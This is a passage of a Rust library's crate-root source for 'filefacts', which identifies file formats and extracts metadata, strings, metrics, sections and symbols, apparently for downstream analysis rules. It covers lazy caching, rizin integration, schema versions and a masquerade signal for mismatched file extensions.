//! # filefacts
//!
//! Fast, thorough metadata, metrics, and string extraction for binary
//! and source file formats.
//!
//! `filefacts` is the single-pass extraction layer underneath higher-level
//! analysis tools. Given a byte slice, it identifies the file format,
//! parses the format's structural fields, scans for string literals, and
//! computes byte-level metrics — once, lazily, sharing the parse across
//! every view.
//!
//! Output views form the public schema:
//!
//! - [`Values`] — residual format structural data, navigable as a JSON tree.
//! - [`Text`] — byte-level printable runs, grouped by extraction
//!   technique.
//! - [`Literals`] — language-defined string literals from source and
//!   structured formats.
//! - [`Metrics`] — derived numeric features (entropy, sizes, counts).
//! - [`Sections`] — binary section / segment listings.
//! - [`Symbols`] — unified named-entity facts (imports, exports,
//!   functions, calls, members, binds, identifiers) tagged by kind.
//! - [`Errors`] — recoverable extractor diagnostics.
//!
//! Alongside the views, [`FileId`] — the result of file-format
//! identification — is always available without computing them.
//!
//! ## Quick start
//!
//! ```no_run
//! let bytes = std::fs::read("sample.exe").unwrap();
//! let parsed = filefacts::open(&bytes);
//!
//! println!("file type: {:?}", parsed.fileid().file_type());
//! for (key, value) in parsed.values().iter() {
//!     println!("{}: {}", key, value);
//! }
//! for s in parsed.text().ascii() {
//!     println!("@{}: {}", s.data_offset, s.value);
//! }
//! for (key, value) in parsed.metrics().iter() {
//!     println!("{} = {}", key, value);
//! }
//! ```
//!
//! ## Design
//!
//! `ParsedFile` borrows the source bytes for its entire lifetime. The
//! extraction views are computed lazily on first access and cached via
//! [`std::sync::OnceLock`], so subsequent accesses are free and views
//! can be safely read from multiple threads.
//!
//! Format extraction is single-pass: a format extractor receives the
//! bytes and writes into every view in one walk. There is no
//! parsing during view materialisation that wasn't requested.
//!
//! ## Configuration
//!
//! [`open`] uses the library defaults. [`OpenOptions`] supplies a path, a
//! known type or [`FileId`], a cancellation flag, and the cache and rizin
//! settings. Every setting belongs to the [`ParsedFile`] it opens, so one
//! process can open files under different settings at once.
//!
//! ```no_run
//! use std::path::Path;
//!
//! let bytes = std::fs::read("sample.exe").unwrap();
//! let parsed = filefacts::OpenOptions::new()
//!     .path(Path::new("sample.exe"))
//!     .rizin(false)
//!     .open(&bytes);
//! ```
//!
//! ## Side effects
//!
//! Opening a file only identifies it. The first view access runs the
//! extraction, which may spawn an installed rizin: once per process to read
//! its version, and per file to recover symbols from PE, ELF and Mach-O
//! binaries (see [`rizin`]). Turn that off with [`OpenOptions::rizin`].
//!
//! The disk cache in [`cache`] is off unless the host opts in with
//! [`OpenOptions::cache`], or the `FILEFACTS_CACHE` environment variable
//! turns it on for hosts that did not choose. When on, the first view access
//! reads a matching entry from the user cache directory, or writes one after
//! computing the views. The `filefacts` CLI opts in (`FILEFACTS_CACHE=0`
//! still turns it off). Diagnostics are written to stderr only when
//! `FILEFACTS_DEBUG` is set.
//!
//! ## Stability
//!
//! The Rust API follows semantic versioning. The output schema is
//! versioned separately via [`SCHEMA_VERSION`]; field additions are
//! non-breaking, field semantics or renames bump the version.

mod bytes;
mod debug;
mod embedded_sources;
mod error;
mod formats;
mod go_dependency_context;
mod go_package_context;
pub mod package_context;
pub use go_dependency_context::{ReferenceMember, go_dependency_context};
pub use go_package_context::go_source_context;
mod output;
mod registry;
mod scan;

pub mod cache;
pub mod cache_sweep;
pub mod fileid;
pub mod tools;

/// Optional rizin/radare2 integration with hardened subprocess
/// discipline (RLIMIT, PR_SET_PDEATHSIG, process-group SIGKILL on
/// timeout / output-cap overflow). Configured per file through
/// [`OpenOptions`]; exposed as a public module only for what is genuinely
/// process-wide: reaping in-flight workers (`kill_all_rizin_groups`) from a
/// signal handler, and `tracing` telemetry (`stats`, `log_stats`).
pub mod rizin;

pub use formats::source::decode_source_escapes;
pub use formats::source::go_package_payload_flow;

/// Additional reference metadata selected by filename, independently of the
/// detected file type. Archive walkers must retain these even when detection
/// calls them non-program data. Type-identified manifests need no exception.
#[must_use]
pub fn has_named_reference_metadata(path: &std::path::Path) -> bool {
    matches!(
        path.file_name().and_then(|name| name.to_str()),
        Some("go.work" | "go.work.sum" | "modules.txt")
    )
}

/// VBA `<non-literal>` sentinel — the placeholder a VBA symbol's
/// `target` field takes when the call was made through a variable
/// or expression rather than a quoted literal. Re-exported flat from
/// the internal extractor so downstream crates can compare against
/// it without learning a private path. The extractor itself stays
/// internal; VBA symbols flow out through the unified [`Symbols`]
/// view like every other format.
pub use formats::vba_symbols::NON_LITERAL_SENTINEL as VBA_NON_LITERAL_SENTINEL;
pub use output::{Flow, FlowFunction, FlowKind, FlowOrigin, FlowOrigins, FlowTransfer, FlowValue};

use std::path::{Path, PathBuf};
use std::sync::OnceLock;
use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};
use std::time::Duration;

pub use embedded_sources::EmbeddedSource;
pub use error::Error;
pub use fileid::{ArchiveFormat, Compression, Container, FileId, FileType, container_of};
pub use output::{
    ArchiveCompression, ArchiveMember, ArchiveOffsets, ArchiveOwnership, Arg, ArgShape, CATALOG,
    Claim, Comments, ErrorKind, Errors, ExtractedString, FAMILIES, Fact, HashAlgo, Identity,
    Literals, MetricKey, Metrics, ParseError, Party, PinnedHash, QueryLimit, RefKind, RefLocator,
    Reference, Section, Sections, Signer, Span, SpanBuilder, Stage, Symbol, SymbolKind, Symbols,
    Text, Trust, Url, UrlKind, VALUE_CATALOG, VALUE_FAMILIES, ValueKey, Values,
    archive_entry_type_count, archive_method_count, ast_op, ast_op_density, declared,
    declared_value_key, dmg_codec_count, extension_content_mismatch, source_query_limited,
};
pub use registry::Registry;

/// Every metric key this build can emit, as fixed names plus the templates
/// for the few keys with a data-derived segment.
///
/// This is the enumeration downstream validators consume — cleave checks
/// every `type: metrics` field in the trait corpus against it, so a rule
/// naming a metric that no extractor emits is a build-time error there
/// rather than a rule that silently never fires. Deriving the same list by
/// scanning filefacts' source is the thing this exists to replace.
#[must_use]
pub fn known_metrics() -> (&'static [&'static str], &'static [&'static str]) {
    (CATALOG, FAMILIES)
}

/// Every [`Values`] key this build can write, as fixed keys
/// ([`VALUE_CATALOG`]) plus templates for keys with a data-derived segment
/// inside the path ([`VALUE_FAMILIES`]).
///
/// This is the [`known_metrics`] counterpart for `type: values` rule fields.
/// Unlike a metric, a value can be an object or an array that a rule reaches
/// into, so a validator should accept a rule path when it:
///
/// - equals a fixed key;
/// - extends a fixed key with `.` or `[`, as in `pe.signatures[0].subject`,
///   `pdf.info.Author` or `npm.author.email`. This also covers data tails
///   written below a key, such as `pkg.<field>` or `wasm.producers.<field>`;
/// - matches a template, where each `<name>` placeholder stands for a
///   non-empty run of characters other than `.` and `[`, either exactly or
///   extended with `.` or `[` as above.
///
/// An index in a rule path, whether `[0]` or the `[*]` wildcard, matches the
/// same way. One kind of path is outside this list: the parsed document of a
/// structured format (JSON, YAML, TOML, plist, `PKG-INFO` and Xcode project
/// files), which filefacts places at the values root verbatim. A rule that
/// reads such a document's own fields, such as `scripts.postinstall` in a
/// `package.json`, names data rather than a filefacts key, so the validator
/// should not report it as unknown.
#[must_use]
pub fn known_values() -> (&'static [&'static str], &'static [&'static str]) {
    (VALUE_CATALOG, VALUE_FAMILIES)
}

/// Schema version of the public output shape.
///
/// Bumps on any field rename or semantic change. Field additions are
/// non-breaking and do not bump this version. The on-disk cache carries a
/// distinct [`cache::CACHE_SCHEMA_VERSION`], bumped only for breaking
/// changes to its format; entries from older builds are never reused
/// because every cache key includes a hash of filefacts' source.
///
/// **v5** — the `Imports`, `Exports`, `Functions`, and `Ast` peer
/// types are collapsed into a single tagged [`Symbol`] enum. The
/// `Function.kind` field is renamed to `decl` (to free the word `kind`
/// for the discriminator) and `Function.calls` is renamed to `callees`
/// (to disambiguate from the new [`Symbol::Call`] kind).
///
/// **v6** — the `Strings` collection is split into peer top-level
/// [`Text`] (byte-scan: ascii + utf16le) and [`Literals`] (parser-
/// extracted language string literals). The `StringCategory` enum and
/// `ExtractedString.category` field are removed; the container
/// identifies the tier.
///
/// **v7** — adds the [`Identity`] view: normalized, cross-format
/// identity claims (name, identifier, project, signer, trust tier,
/// authors, document title/producer, unique ids) folded out of the
/// per-format structural values, each tagged claimed-vs-verified.
///
/// **v8** — metrics gain byte-span provenance. A *located* metric (one
/// measured from a specific region — `binary.peak_region_entropy`,
/// `text.invisible_chars`, `sections.entropy_max`, …) now serializes as
/// `{"value": n, "spans": [{"offset", "len"}, …]}` instead of a bare
/// number; unlocated metrics are unchanged. This is a value-shape change,
/// so a consumer parsing every metric as a number must handle the object
/// form. `stng::ExtractedString` also gains a `data_len` source extent.
///
/// **v9** — 75 value and metric keys are renamed to follow one naming
/// convention (21 value keys, 54 metric keys); no key changes meaning or
/// value except its name. Package links and identity fold onto the
/// cross-format names (`whl.home_page`, `crx.homepage_url`, `rpm.url` →
/// `<fmt>.homepage`; `deb.package`, `nupkg.id`, `apk.pkgname` →
/// `<fmt>.name`), `pe.imphash` moves to `pe.hashes.imphash` beside the ELF
/// and Mach-O fingerprints, counts take `_count` (`scpt.handlers` →
/// `scpt.handler_count`), abbreviations are spelled out
/// (`binary.huge_func_count` → `binary.huge_function_count`), and units
/// that are not bytes become a suffix (`deb.installed_size` →
/// `deb.installed_size_kib`). Identity claim sources name the new keys.
/// `docs/NAMING.md` states the convention and `docs/schema-v9-renames.tsv`
/// lists every old → new pair.
pub const SCHEMA_VERSION: &str = "9";

/// A file with its bytes and lazily-computed metadata views.
///
/// `ParsedFile` is the central type. Construct one with [`open`] or its
/// path-aware variants; [`from_path`] reads the bytes from disk first.
///
/// Views are computed on first access and cached for the lifetime of
/// the `ParsedFile`. That first access may spawn rizin, and reads and
/// writes the disk cache when the host enabled it; see the crate-level
/// "Side effects" section.
///
/// Typed fact families such as strings, sections, symbols, AST
/// projections, and recoverable errors live in their own views;
/// [`values`] is only for residual format structure that does not
/// already have a typed home.
///
/// [`values`]: ParsedFile::values
#[must_use = "ParsedFile owns the extraction pipeline; dropping it discards every view"]
pub struct ParsedFile<'a> {
    bytes: &'a [u8],
    fileid: FileId,
    // Basename of the path given to `OpenOptions::path`. None when the
    // file was opened from a byte slice with no associated path. When
    // present, surfaced as the `file.basename` value during extraction so
    // traits can match against it via `type: value, path: file.basename`.
    basename: Option<String>,
    // Shared tree-sitter parse for source files. Built once by
    // `tree_cache()` and consumed by the single extraction pipeline
    // that fills `extracted`.
    tree_parse: OnceLock<Option<formats::source::TreeParse<'a>>>,
    flow: OnceLock<Option<Flow>>,
    /// `Err` holds the message of a panic the CFML parse raised.
    cfml_parse: OnceLock<Option<Result<formats::cfml::Parsed, String>>>,
    // Caller's cancellation flag, polled by long-running leaf work (currently
    // the tree-sitter parse). Borrowed rather than `Arc`-shared, and never
    // written here: filefacts only ever reads it.
    cancellation: Option<&'a AtomicBool>,
    // Whether `extracted` reads and writes the disk cache.
    cache: bool,
    // This file's rizin settings, carried into the extraction.
    rizin: rizin::Settings,
    extracted: OnceLock<Extracted>,
    // How many times this `ParsedFile` ran its extraction pipeline.
    // A correctly-implemented `ParsedFile` never reports more than 1
    // regardless of which views the caller reads.
    parse_count: AtomicU32,
}

/// Borrowed source parse owned by a [`ParsedFile`].
///
/// This exposes the shared tree-sitter tree to host tools that need
/// their own AST queries. The tree is still owned and cached by
/// `ParsedFile`; callers borrow it and must keep the `ParsedFile`
/// alive for as long as they use this view.
#[derive(Debug, Clone, Copy)]
pub struct SourceAst<'tree> {
    /// UTF-8 source text used to build the tree.
    pub source: &'tree str,
    /// Shared tree-sitter parse tree.
    pub tree: &'tree tree_sitter::Tree,
    /// File type used to select the parser.
    pub file_type: FileType,
}

impl std::fmt::Debug for ParsedFile<'_> {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("ParsedFile")
            .field("fileid", &self.fileid)
            .field("byte_count", &self.bytes.len())
            .field("parse_count", &self.parse_count())
            .finish()
    }
}

/// The owned, serializable extraction snapshot. Round-trips through the
/// disk cache ([`crate::cache`]) so the expensive recovery — chiefly the
/// rizin disassembly pass folded into `symbols`/`sections`/`metrics` —
/// is computed once per `(content, filefacts build, rizin config)` and
/// reused across processes rather than re-run on every `open`.
#[derive(serde::Serialize, serde::Deserialize)]
struct Extracted {
    values: Values,
    strings: output::Strings,
    metrics: Metrics,
    archive_members: Vec<ArchiveMember>,
    sections: Sections,
    symbols: Symbols,
    identity: Identity,
    references: Vec<Reference>,
    errors: Errors,
}

/// On-disk cache form of [`Extracted`]. The byte-scan `text` rows are stored
/// as one list in extraction order: `Text`'s own serialized form groups them
/// by encoding, which would hand a second `open` the rows in another order.
///
/// They are cached under filefacts' key like everything else here, and that
/// key covers `Cargo.toml` (see `build.rs`), which pins stng to an exact
/// commit: bumping stng retires every entry, with no version to maintain.
#[derive(serde::Serialize, serde::Deserialize)]
struct ExtractedSnapshot {
    values: Values,
    text: Vec<stng::ExtractedString>,
    literals: output::Literals,
    comments: output::Comments,
    metrics: Metrics,
    archive_members: Vec<ArchiveMember>,
    sections: Sections,
    symbols: Symbols,
    identity: Identity,
    references: Vec<Reference>,
    errors: Errors,
}

impl From<Extracted> for ExtractedSnapshot {
    fn from(e: Extracted) -> Self {
        Self {
            values: e.values,
            text: e.strings.text.rows().to_vec(),
            literals: e.strings.literals,
            comments: e.strings.comments,
            metrics: e.metrics,
            archive_members: e.archive_members,
            sections: e.sections,
            symbols: e.symbols,
            identity: e.identity,
            references: e.references,
            errors: e.errors,
        }
    }
}

impl From<ExtractedSnapshot> for Extracted {
    fn from(s: ExtractedSnapshot) -> Self {
        Self {
            values: s.values,
            strings: output::Strings {
                text: output::Text::from_rows(s.text.into()),
                literals: s.literals,
                comments: s.comments,
            },
            metrics: s.metrics,
            archive_members: s.archive_members,
            sections: s.sections,
            symbols: s.symbols,
            identity: s.identity,
            references: s.references,
            errors: s.errors,
        }
    }
}

impl<'a> ParsedFile<'a> {
    /// The source bytes this `ParsedFile` borrows.
    pub fn bytes(&self) -> &'a [u8] {
        self.bytes
    }

    /// The file-identification result. Always available without
    /// triggering extraction.
    pub fn fileid(&self) -> &FileId {
        &self.fileid
    }

    /// Structural key-value view. Computed on first access and cached.
    pub fn values(&self) -> &Values {
        &self.extracted().values
    }

    /// Declared script bodies in a supported container format. Bodies borrow
    /// the parsed values; no script is executed and no reference is fetched.
    /// Unknown interpreters remain explicit rather than being guessed from text.
    pub fn embedded_sources(&self) -> impl Iterator<Item = EmbeddedSource<'_>> {
        // Each reader sees the value tree only for the format it understands,
        // and only that format pays for the extraction.
        let file_type = self.fileid.file_type();
        let actions = (file_type == FileType::GithubActions).then(|| self.values());
        let rpm = (file_type == FileType::Rpm).then(|| self.values());
        embedded_sources::github_actions(actions).chain(embedded_sources::rpm(rpm))
    }

    /// Byte-scan extracted strings (printable ASCII / UTF-16LE runs).
    /// The Unix `strings(1)` tier. Computed on first access and cached.
    pub fn text(&self) -> &Text {
        &self.extracted().strings.text
    }

    /// Parser-extracted language string literals (tree-sitter / JSON /
    /// YAML / TOML). The precise tier — no comment or code false
    /// positives. Computed on first access and cached.
    pub fn literals(&self) -> &Literals {
        &self.extracted().strings.literals
    }

    /// Source-code comment bodies — the comment-scoped tier. Populated
    /// for source files from the language's comment style. Matching here
    /// never fires on a keyword in code or a string, only in a genuine
    /// comment. Computed on first access and cached.
    pub fn comments(&self) -> &Comments {
        &self.extracted().strings.comments
    }

    /// Numeric metrics view. Computed on first access and cached.
    pub fn metrics(&self) -> &Metrics {
        &self.extracted().metrics
    }

    /// Typed archive member index.
    ///
    /// Empty for non-archive formats. For ZIP-family files, this is
    /// built from the same central-directory walk that emits
    /// `archive.members[]`, so callers can consume offsets and
    /// metadata without re-reading JSON.
    pub fn archive_members(&self) -> &[ArchiveMember] {
        &self.extracted().archive_members
    }

    /// Borrow the shared tree-sitter parse, if this is a supported
    /// UTF-8 source file and parsing succeeded.
    ///
    /// This is the zero-copy handoff for downstream rule engines: it
    /// returns the same tree used by filefacts's own source extraction
    /// rather than forcing callers to parse the source again.
    pub fn source_ast(&self) -> Option<SourceAst<'_>> {
        self.tree_cache().map(|cache| SourceAst {
            source: cache.source(),
            tree: cache.tree(),
            file_type: cache.file_type(),
        })
    }

    /// Section / segment listing for binary formats.
    ///
    /// Empty for files without a section table (structured documents,
    /// source code, archives). Each [`Section`] carries its name,
    /// virtual and on-disk extents, per-section Shannon entropy, and
    /// a format-conventional flag vocabulary.
    pub fn sections(&self) -> &Sections {
        &self.extracted().sections
    }

    /// Unified named-entity facts about this file.
    ///
    /// Every row is a [`Symbol`] tagged by [`SymbolKind`]: imports,
    /// exports, locally-defined functions (with CFG metrics when rizin
    /// disassembled), source call sites, dotted member-access chains,
    /// static bindings, and bare identifiers. Which kinds populate
    /// depends on the file type. Filter with [`Symbols::iter_kind`].
    pub fn symbols(&self) -> &Symbols {
        &self.extracted().symbols
    }

    /// Lazily compute format-neutral value relationships.
    /// No security policy or library model is assumed. Reading other views
    /// does not pay for this graph, and repeated reads never parse again.
    /// Returns `None` when flow extraction is unavailable, not an empty graph.
    /// Source parsers (tree-sitter and bounded CFML tags) produce flow; binary flow recovery is
    /// not implemented. The graph records its producer and known limitations.
    pub fn flow(&self) -> Option<&Flow> {
        if let Some(parsed) = self.cfml_parse() {
            return Some(&parsed.flow);
        }
        self.flow
            .get_or_init(|| {
                let cache = self.tree_cache()?;
                // A panic leaves flow unavailable rather than taking the
                // caller down; the other views are unaffected.
                guarded(|| formats::source::build_value_flow(cache, self.symbols())).ok()
            })
            .as_ref()
    }

    /// Normalized identity claims: who and what the artifact says it
    /// is, folded across formats into one shape and tagged
    /// claimed-vs-verified. Computed on first access and cached.
    ///
    /// Empty (see [`Identity::is_empty`]) for files that assert no
    /// identity and carry no signature.
    pub fn identity(&self) -> &Identity {
        &self.extracted().identity
    }

    /// External references this artifact points at — declared packages,
    /// install-hook URLs, staged downloads — normalized to PURL where the
    /// ecosystem is identifiable, else a raw URL. Recorded, never fetched;
    /// a downstream fetcher resolves and verifies them. Empty for files
    /// that reference nothing. Computed on first access and cached.
    pub fn references(&self) -> &[Reference] {
        &self.extracted().references
    }

    /// Non-fatal extraction errors encountered during the parse.
    ///
    /// Filefacts always returns as much data as it can: when a goblin
    /// lazy walker panics or a sub-table is truncated, the failure
    /// is recorded here and the rest of the extraction continues.
    /// Empty when nothing went wrong. See [`crate::ParseError`] for
    /// the entry shape.
    pub fn errors(&self) -> &Errors {
        &self.extracted().errors
    }

    /// Whether rizin symbol recovery was attempted but did not complete
    /// on this run.
    ///
    /// `true` means rizin is installed (so the symbol/section views would
    /// normally be rizin-grade) yet this particular run produced nothing
    /// — it timed out, was killed on the output cap, or had turned itself
    /// off after too many abandoned output readers. The bytes are
    /// unchanged, so a later run may succeed; a caller caching analysis
    /// output keyed by content **must not persist a payload while this is
    /// `true`**, or the degraded result would be served to every future
    /// run. Pair with [`crate::cache::Computed::Transient`] and
    /// [`OpenOptions::rizin_fingerprint`]. Always `false` when rizin is not
    /// installed, turned off with [`OpenOptions::rizin`], or skipped the
    /// input under [`OpenOptions::rizin_max_bytes`]: those results are
    /// correct for that environment and those settings, and keyed as such.
    pub fn rizin_recovery_incomplete(&self) -> bool {
        rizin_incomplete(self.metrics())
    }

    /// Iterate every symbol name across the declaration kinds
    /// (`Import`, `Export`, `Function`) for cross-cutting matchers
    /// that ask "any declared name of this value regardless of role."
    pub fn symbol_iter(&self) -> impl Iterator<Item = &str> {
        self.symbols().iter().filter_map(|s| match s {
            Symbol::Import { name, .. }
            | Symbol::Export { name, .. }
            | Symbol::Function { name, .. } => Some(name.as_str()),
            _ => None,
        })
    }

    /// Borrow the shared tree-sitter parse, if this file is a source
    /// language and parsing succeeded.
    fn tree_cache(&self) -> Option<&formats::source::TreeCache<'a>> {
        self.tree_parse()
            .and_then(formats::source::TreeParse::cache)
    }

    fn tree_parse(&self) -> Option<&formats::source::TreeParse<'a>> {
        self.tree_parse
            .get_or_init(|| {
                if !formats::source::supports(self.fileid.file_type()) {
                    return None;
                }
                let parsed = guarded(|| {
                    formats::source::TreeCache::parse(
                        self.bytes,
                        self.fileid.file_type(),
                        self.cancellation,
                    )
                });
                Some(parsed.unwrap_or_else(|message| {
                    formats::source::TreeParse::Unavailable(
                        formats::source::TreeSitterDiagnostic::parse_failed(message),
                    )
                }))
            })
            .as_ref()
    }

    /// Number of times this `ParsedFile` ran its extraction pipeline.
    ///
    /// `0` before any view has been requested, and stays `0` when the
    /// views were served from the disk cache; otherwise `1` after the
    /// first call to any extraction view (`values()`, `text()`,
    /// `metrics()`, `symbols()`, …). A correctly-implemented `ParsedFile`
    /// never reports a higher count, regardless of which combination of
    /// views the caller reads.
    pub fn parse_count(&self) -> u32 {
        self.parse_count.load(Ordering::Acquire)
    }

    fn cfml_parse(&self) -> Option<&formats::cfml::Parsed> {
        self.cfml_outcome()?.as_ref().ok()
    }

    fn cfml_outcome(&self) -> Option<&Result<formats::cfml::Parsed, String>> {
        if self.fileid.file_type() != FileType::Cfml {
            return None;
        }
        self.cfml_parse
            .get_or_init(|| Some(guarded(|| formats::cfml::parse(self.bytes))))
            .as_ref()
    }

    fn extracted(&self) -> &Extracted {
        self.extracted.get_or_init(|| {
            if !self.cache {
                return self.run_pipeline();
            }
            // The disk cache is keyed by (content, filefacts build, detected
            // type, basename, rizin settings). Type belongs in the key because detection
            // may use the logical filename: identical gzip bytes named
            // `package.tgz` and `hash.sample` are npm and generic gzip inputs,
            // respectively, and expose different identity/structure views.
            // Basename also produces facts independent of detected type:
            // `build.rs` and `lib.rs` must not share `file.basename`, nor may
            // Go workspace and module metadata inherit one another's context.
            // A degraded rizin run is returned but not persisted, so a later
            // healthy run still gets to fill the entry.
            let variant = extraction_cache_variant(
                &self.rizin,
                self.fileid.file_type(),
                self.fileid.extension_mismatch(),
                self.fileid.extension_mismatch_transition(),
                self.basename.as_deref(),
            );
            let snapshot: Option<ExtractedSnapshot> =
                cache::open_with_cache(self.bytes, &variant, |_| {
                    let extracted = self.run_pipeline();
                    let transient = rizin_incomplete(&extracted.metrics);
                    let snapshot = ExtractedSnapshot::from(extracted);
                    if transient {
                        Some(cache::Computed::Transient(snapshot))
                    } else {
                        Some(cache::Computed::Cacheable(snapshot))
                    }
                });
            // `None` only when the closure declines, which it never does.
            snapshot.map_or_else(|| self.run_pipeline(), Extracted::from)
        })
    }

    /// Run the extraction pipeline once and count it. The single place
    /// `run_extraction` is invoked, whether the result is destined for the
    /// cache or returned directly.
    fn run_pipeline(&self) -> Extracted {
        self.parse_count.fetch_add(1, Ordering::AcqRel);
        let mut extracted = run_extraction(
            self.bytes,
            &self.fileid,
            self.basename.as_deref(),
            self.tree_cache(),
            self.tree_parse()
                .and_then(formats::source::TreeParse::diagnostic),
            self.rizin,
        );
        match self.cfml_outcome() {
            Some(Ok(parsed)) => {
                for symbol in parsed.symbols.iter() {
                    extracted.symbols.push(symbol.clone());
                }
            }
            Some(Err(message)) => {
                extracted
                    .errors
                    .record_panic(Stage::SourceParse, message.clone());
                extracted
                    .metrics
                    .insert(metric!("parse.error_count"), extracted.errors.len() as f64);
            }
            None => {}
        }
        extracted
    }
}

/// Run parse work that sits outside the extraction pipeline's own
/// `catch_unwind` (the source parse, the CFML parse, the flow graph), turning
/// a panic into its message. Without this, one malformed file takes down the
/// whole host process.
fn guarded<T>(work: impl FnOnce() -> T) -> Result<T, String> {
    match formats::goblin_safe::catch_infallible(work) {
        formats::goblin_safe::GoblinOutcome::Ok(value) => Ok(value),
        formats::goblin_safe::GoblinOutcome::Panicked(message) => Err(message),
        formats::goblin_safe::GoblinOutcome::Failed(error) => Err(error.to_string()),
    }
}

/// Whether a rizin run that should have recovered symbols did not complete.
/// Both the public predicate and the don't-persist decision read it here, so
/// they cannot disagree; `metric!` checks the key against the catalog.
fn rizin_incomplete(metrics: &Metrics) -> bool {
    metrics
        .get(metric!("binary.rizin_incomplete").as_str())
        .is_some()
}

/// Everything besides the bytes and the build that a cached extraction
/// depends on (see [`ParsedFile::extracted`]); [`cache::cache_key`] folds in
/// the rest.
fn extraction_cache_variant(
    rizin: &rizin::Settings,
    file_type: FileType,
    extension_mismatch: bool,
    mismatch_transition: Option<(&'static str, &'static str)>,
    basename: Option<&str>,
) -> String {
    // The content/extension transition is path-derived but lands in the
    // extraction output as `consistency.extension_content_mismatch.*`, so it
    // belongs in the key: identical bytes named `x.woff2` and `x.wav` detect
    // as the same type but produce different metrics, and must not share an
    // entry. Without this, whichever name was scanned first won and every
    // later identical-byte file inherited its verdict — a shell script named
    // `.woff2` reported `script_as_unknown` (missing the masquerade) or a
    // `.wav` reported `script_as_font` (inventing one), purely by scan order.
    //
    // The *group* is folded in rather than the raw extension, so the key
    // space stays small: every unrecognised suffix collapses to one bucket,
    // and the thousands of `.woff2` fonts in a tree still share entries.
    let transition = match (extension_mismatch, mismatch_transition) {
        (false, _) => std::borrow::Cow::Borrowed("-"),
        (true, None) => std::borrow::Cow::Borrowed("?"),
        (true, Some((content, ext))) => std::borrow::Cow::Owned(format!("{content}_as_{ext}")),
    };
    format!(
        "{};file_type={};mismatch={};basename={basename:?}",
        rizin::cache_fingerprint(rizin),
        file_type.label(),
        transition
    )
}

fn run_extraction(
    bytes: &[u8],
    fileid: &FileId,
    basename: Option<&str>,
    tree_cache: Option<&formats::source::TreeCache<'_>>,
    tree_diagnostic: Option<&formats::source::TreeSitterDiagnostic>,
    rizin: rizin::Settings,
) -> Extracted {
    let file_type = fileid.file_type();
    let extension_mismatch = fileid.extension_mismatch();
    let mismatch_transition = fileid.extension_mismatch_transition();
    let xor_pe_key = fileid.xor_pe_key();
    let mut values = Values::new();
    let mut strings = output::Strings::new();
    let mut metrics = Metrics::new();
    let mut archive_members = Vec::new();
    let mut sections: Vec<Section> = Vec::new();
    let mut image_end: Option<u64> = None;
    let mut symbols = Symbols::new();
    let mut errors = Errors::new();
    if fileid.source() == fileid::DetectionSource::Failed {
        errors.record_panic(Stage::Identify, "file identification panicked");
    }
    if let Some(name) = basename {
        values.insert_key(
            value_key!("file.basename"),
            serde_json::Value::String(name.to_string()),
        );
        values.insert_key(
            value_key!("file.stem"),
            serde_json::Value::String(formats::common::stem(name)),
        );
    }
    // Content-based detection disagreed with the file's extension — a
    // low-friction masquerade signal. Emitted only when true (and only when a
    // path/extension was supplied), mirroring the pe.dos_stub_* convention.
    // The typed sub-metric names the content→extension group transition
    // (e.g. `…_mismatch.binary_as_image` for a PE named `.png`) so a trait can
    // decide which transitions are dangerous instead of relying on a severity
    // verdict baked in here.
    if extension_mismatch {
        metrics.insert(metric!("consistency.extension_content_mismatch"), 1.0);
        if let Some((content, ext)) = mismatch_transition {
            metrics.insert(crate::extension_content_mismatch(content, ext), 1.0);
        }
    }
    if let Some(diagnostic) = tree_diagnostic {
        metrics.insert(metric!("source.ast_unavailable"), 1.0);
        metrics.insert(diagnostic.metric.clone(), 1.0);
        errors.record_fallback(crate::Stage::SourceParse, diagnostic.message.clone());
    }
    // Format extractors return `Result` so they can report a hard
    // "this file is not in the format I expect" failure. Any
    // recoverable mid-extraction issues (goblin lazy-walker panics,
    // truncated sub-tables, permissive-mode fallbacks) are recorded
    // through the typed `Errors` view instead — we want consumers to
    // get everything we did manage to extract even when some sub-
    // stage failed, since cleave depends on the partial data.
    let extract_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        formats::extract(
            file_type,
            bytes,
            tree_cache,
            formats::ExtractCtx {
                values: &mut values,
                strings: &mut strings,
                metrics: &mut metrics,
                archive_members: &mut archive_members,
                sections: &mut sections,
                symbols: &mut symbols,
                errors: &mut errors,
                image_end: &mut image_end,
                basename,
                xor_pe_key,
                rizin,
            },
        )
    }));
    match extract_result {
        Ok(Ok(())) => {}
        Ok(Err(e)) => {
            // The format extractor bailed entirely. Surface that as a
            // `malformed` entry so cleave can see *why* the
            // format-specific view is sparse.
            errors.record_malformed(stage_for(file_type), e.to_string());
        }
        Err(payload) => {
            let stage = stage_for(file_type);
            if stage == Stage::SourceExtract {
                metrics.insert(metric!("source.extract_panicked"), 1.0);
                metrics.insert(metric!("source.ast_unavailable"), 1.0);
            }
            errors.record_panic(stage, panic_payload_message(payload));
        }
    }
    // Tree-sitter source extraction also pushes Call/Member/Bind/
    // Identifier symbols when a parse is available. Bundling here
    // keeps `parse_count` at 1 regardless of which views the caller
    // reads.
    if let Some(cache) = tree_cache {
        let walk_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            formats::source::build_symbols(cache, &mut symbols, &mut metrics);
        }));
        if let Err(payload) = walk_result {
            metrics.insert(metric!("source.ast_walk_panicked"), 1.0);
            metrics.insert(metric!("source.ast_unavailable"), 1.0);
            errors.record_panic(Stage::SourceAstWalk, panic_payload_message(payload));
        }
    }
    let sections = Sections::from_iter(sections);
    // Aggregate metrics derived from sections — mirrors the
    // `sections.*` path convention.
    if !sections.is_empty() {
        emit_section_metrics(&sections, &mut metrics);
        emit_binary_aggregates(&sections, &strings, bytes, &mut metrics);
    }
    if image_end.is_some() || !sections.is_empty() {
        emit_binary_overlay(&sections, bytes, image_end, &mut metrics);
    }

    // Per-kind counts for ergonomic rule filtering. Derived from the
    // unified `symbols` view.
    emit_symbol_kind_counts(&symbols, &mut metrics);
    if !errors.is_empty() {
        metrics.insert(metric!("parse.error_count"), errors.len() as f64);
    }

    // Fold the per-format structural values into the normalized,
    // cross-format identity view. Runs last so it can read everything
    // every extractor wrote (signature fields, manifest claims,
    // document properties). Never fails — absent inputs yield an empty
    // identity.
    let identity = formats::identity::derive(file_type, bytes, &values);

    // External references this file points at (declared packages, install
    // hooks, staged URLs), normalized to PURL/URL. Reads the same `values`
    // the format extractors wrote; never fetches.
    let references = formats::references::derive(file_type, bytes, &values);

    Extracted {
        values,
        strings,
        metrics,
        archive_members,
        sections,
